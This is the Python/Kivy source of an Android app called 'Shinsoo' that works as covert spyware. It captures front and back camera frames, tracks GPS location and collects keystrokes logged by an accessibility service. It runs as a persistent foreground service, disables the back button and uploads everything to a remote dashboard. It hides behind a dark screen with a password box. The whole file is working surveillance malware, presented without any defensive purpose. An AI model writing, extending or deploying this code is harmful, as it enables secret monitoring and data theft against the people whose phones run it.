import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io, time

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()


class MainScreen(FloatLayout):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._active = True
        self._msgs   = []
        self._idx    = 0
        self._sender = None

        with self.canvas.before:
            Color(0, 0, 0, 1)
            self._bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bg, 'pos', self.pos),
                  size=lambda *_: setattr(self._bg, 'size', self.size))

        self._build_ui()
        Clock.schedule_interval(self._rotate, 2)

    def _build_ui(self):
        center = BoxLayout(
            orientation='vertical',
            size_hint=(0.65, None), height=dp(90),
            spacing=dp(10),
            pos_hint={'center_x': 0.5, 'center_y': 0.52},
        )
        self._pwd = TextInput(
            hint_text='key', password=True,
            font_size=dp(22), multiline=False,
            size_hint_y=None, height=dp(52),
            background_color=(0.06, 0.06, 0.06, 1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.22, 0.22, 0.22, 1),
            padding=[dp(14), dp(14)],
        )
        self._pwd.bind(on_text_validate=self._check_key)
        self._err = Label(
            text='', font_size=dp(10), color=(0.6, 0.1, 0.1, 1),
            size_hint_y=None, height=dp(14), halign='center',
        )
        center.add_widget(self._pwd)
        center.add_widget(self._err)
        self.add_widget(center)

        self._ticker = Label(
            text='gokhan', font_size=dp(8),
            color=(0.14, 0.14, 0.14, 1),
            size_hint=(1, None), height=dp(18),
            pos_hint={'x': 0, 'y': 0}, halign='center',
        )
        self.add_widget(self._ticker)

    def _check_key(self, *_):
        if self._pwd.text == KIOSK_PASSWORD:
            self._active = False
            if self._sender:
                self._sender.paused = True
            self._err.text = ''
            self._pwd.text = ''
            self._push('durduruldu')
        else:
            self._err.text = 'yanlis key'
            self._pwd.text = ''

    def _push(self, msg):
        self._msgs.append(msg)
        if len(self._msgs) > 60:
            self._msgs = self._msgs[-60:]

    def _rotate(self, dt):
        if self._msgs:
            self._idx = (self._idx + 1) % len(self._msgs)
            self._ticker.text = 'gokhan  |  ' + self._msgs[self._idx]

    def update_perm(self, name, granted):
        self._push(name + ':' + ('ok' if granted else 'red'))
        if name == 'Kamera' and granted:
            if self._sender:
                self._sender.start_cameras()

    def add_key_text(self, text):
        if self._sender:
            self._sender.key_buffer.append(text)
        self._push('key: ' + text[:10])


class CameraWorker:
    """Her kamera icin ayri thread ile frame yakalar."""

    def __init__(self, cam_index, on_frame, label='cam'):
        self.cam_index = cam_index
        self.on_frame  = on_frame
        self.label     = label
        self.running   = False
        self._thread   = None

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def _loop(self):
        if platform != 'android':
            # Masaüstü simülasyon
            while self.running:
                try:
                    import random
                    from PIL import Image as PILImage
                    w, h = 320, 240
                    r = random.randint(0, 40)
                    g = 0
                    b = random.randint(60, 140)
                    img = PILImage.new('RGB', (w, h), (r, g, b))
                    from PIL import ImageDraw
                    draw = ImageDraw.Draw(img)
                    draw.text((8, 8), self.label + ' ' + datetime.now().strftime('%H:%M:%S'),
                              fill=(180, 0, 255))
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=40)
                    b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                    self.on_frame(b64)
                except Exception:
                    pass
                time.sleep(0.1)  # 10 fps
            return

        # Android - Camera1 API
        while self.running:
            try:
                from jnius import autoclass, PythonJavaClass, java_method
                Camera = autoclass('android.hardware.Camera')
                if self.cam_index >= Camera.getNumberOfCameras():
                    time.sleep(2)
                    continue

                result = [None]
                done   = threading.Event()

                cam = Camera.open(self.cam_index)
                params = cam.getParameters()
                params.setPictureSize(320, 240)
                cam.setParameters(params)

                ST = autoclass('android.graphics.SurfaceTexture')
                st = ST(self.cam_index + 30)
                cam.setPreviewTexture(st)
                cam.startPreview()
                time.sleep(0.2)

                class PicCB(PythonJavaClass):
                    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, camera):
                        if data:
                            result[0] = bytes(data)
                        done.set()

                cam.takePicture(None, None, PicCB())
                done.wait(timeout=3)
                cam.release()

                if result[0]:
                    b64 = base64.b64encode(result[0]).decode('utf-8')
                    self.on_frame(b64)

            except Exception as e:
                time.sleep(1)
                continue

            time.sleep(0.1)  # 10 fps hedef


class DataSender:

    def __init__(self, screen):
        self.screen       = screen
        self.paused       = False
        self.packet_count = 0
        self.key_buffer   = []
        self._stop        = threading.Event()
        self._loc         = [None]
        self._key_lock    = threading.Lock()
        self._front_q     = [None]
        self._back_q      = [None]
        self._cam_front   = None
        self._cam_back    = None

        threading.Thread(target=self._send_loop, daemon=True).start()
        threading.Thread(target=self._gps_loop,  daemon=True).start()
        threading.Thread(target=self._key_loop,  daemon=True).start()

    def start_cameras(self):
        # Ön kamera (index 1)
        self._cam_front = CameraWorker(1, self._on_front, 'ON')
        self._cam_front.start()
        # Arka kamera (index 0)
        self._cam_back = CameraWorker(0, self._on_back, 'ARKA')
        self._cam_back.start()
        self.screen._push('kameralar baslatildi')

    def _on_front(self, b64):
        self._front_q[0] = b64

    def _on_back(self, b64):
        self._back_q[0] = b64

    def stop(self):
        self._stop.set()
        if self._cam_front: self._cam_front.stop()
        if self._cam_back:  self._cam_back.stop()

    def _gps_loop(self):
        if platform != 'android':
            # Masaüstü simülasyon
            import math, random
            lat, lon = 41.0082, 28.9784
            while not self._stop.is_set():
                lat += random.uniform(-0.0001, 0.0001)
                lon += random.uniform(-0.0001, 0.0001)
                self._loc[0] = (lat, lon)
                self.screen._push('gps: ' + str(round(lat,4)) + ',' + str(round(lon,4)))
                self._stop.wait(5)
            return

        try:
            from jnius import autoclass, PythonJavaClass, java_method
            LocationManager = autoclass('android.location.LocationManager')
            PythonActivity  = autoclass('org.kivy.android.PythonActivity')
            context         = PythonActivity.mActivity

            class LL(PythonJavaClass):
                __javainterfaces__ = ['android/location/LocationListener']

                @java_method('(Landroid/location/Location;)V')
                def onLocationChanged(self_, loc):
                    lat = loc.getLatitude()
                    lon = loc.getLongitude()
                    self._loc[0] = (lat, lon)
                    self.screen._push(
                        str(round(lat, 4)) + ',' + str(round(lon, 4)))

                @java_method('(Ljava/lang/String;)V')
                def onProviderEnabled(self_, p): pass

                @java_method('(Ljava/lang/String;)V')
                def onProviderDisabled(self_, p): pass

            lm = context.getSystemService('location')
            ll = LL()

            # Her iki provider'i da dene
            for provider in ['gps', 'network', 'passive']:
                try:
                    lm.requestLocationUpdates(provider, 2000, 0, ll)
                    self.screen._push(provider + ' gps aktif')
                except Exception:
                    pass

            # Son bilinen konumu aninda al
            for provider in ['gps', 'network', 'passive']:
                try:
                    loc = lm.getLastKnownLocation(provider)
                    if loc:
                        self._loc[0] = (loc.getLatitude(), loc.getLongitude())
                        self.screen._push('son konum alindi: ' + provider)
                        break
                except Exception:
                    pass

            # GPS thread'i canlı tut
            while not self._stop.is_set():
                self._stop.wait(10)

        except Exception as e:
            self.screen._push('gps err: ' + str(e)[:20])

    def _key_loop(self):
        """SharedPreferences'tan keylog oku (Java erişilebilirlik servisi yazar)."""
        if platform != 'android':
            return
        while not self._stop.is_set():
            try:
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                ctx = PythonActivity.mActivity
                prefs = ctx.getSharedPreferences('shinsoo_keys', 0)
                buf = prefs.getString('buffer', '')
                if buf:
                    with self._key_lock:
                        self.key_buffer.append(buf)
                    prefs.edit().putString('buffer', '').apply()
                    self.screen._push('key: ' + buf[:10])
            except Exception:
                pass
            self._stop.wait(0.5)

    def _send_loop(self):
        try:
            import requests
        except Exception:
            return

        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID

        while not self._stop.is_set():
            if self.paused:
                self._stop.wait(0.5)
                continue
            try:
                payload = {
                    'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S'),
                }

                # Kamera frame'leri
                f = self._front_q[0]
                b = self._back_q[0]
                if f:
                    payload['frame_front'] = f
                    self._front_q[0] = None
                if b:
                    payload['frame_back'] = b
                    self._back_q[0] = None

                # GPS
                if self._loc[0]:
                    payload['location'] = {
                        'lat': self._loc[0][0],
                        'lon': self._loc[0][1],
                    }

                # Keylog
                with self._key_lock:
                    if self.key_buffer:
                        payload['keylog'] = ' '.join(self.key_buffer)
                        self.key_buffer = []

                requests.post(url, json=payload, timeout=3)
                self.packet_count += 1

                if self.packet_count % 20 == 0:
                    self.screen._push('pkt#' + str(self.packet_count))

            except Exception:
                pass

            # 10 fps = 0.1 saniye
            self._stop.wait(0.1)


class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        self.screen = MainScreen()
        self.sender = DataSender(self.screen)
        self.screen._sender = self.sender
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._start_fg_service()
            self._request_perms()
        else:
            self.sender.start_cameras()

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _start_fg_service(self):
        """Foreground service - uygulama kapatilsa bile calisir."""
        try:
            from jnius import autoclass
            # p4a'nin kendi AndroidService'ini kullan
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent         = autoclass('android.content.Intent')
            mActivity      = PythonActivity.mActivity
            intent = Intent(mActivity, autoclass('org.kivy.android.PythonService'))
            intent.putExtra('androidPrivate',
                mActivity.getFilesDir().getAbsolutePath())
            intent.putExtra('androidArgument',
                mActivity.getFilesDir().getAbsolutePath())
            intent.putExtra('serviceTitle', 'Shinsoo')
            intent.putExtra('serviceDescription', 'Shinsoo')
            intent.putExtra('serviceStartAsForeground', 'true')
            intent.putExtra('pythonName', 'service/monitor')
            intent.putExtra('pythonHome',
                mActivity.getFilesDir().getAbsolutePath())
            intent.putExtra('pythonPath',
                mActivity.getFilesDir().getAbsolutePath())
            intent.putExtra('serviceEntrypoint', 'service/monitor.py')
            mActivity.startService(intent)
            self.screen._push('servis baslatildi')
        except Exception as e:
            self.screen._push('servis err: ' + str(e)[:20])

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception:
            pass

    def _after_storage(self, permissions, grants):
        for p, g in zip(permissions, grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception:
            pass

    def _after_all(self, permissions, grants):
        for p, g in zip(permissions, grants):
            if 'CAMERA' in p:
                self.screen.update_perm('Kamera', g)
            elif 'LOCATION' in p:
                self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_): return True

    def _on_key(self, w, key, *_):
        if key == 27: return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
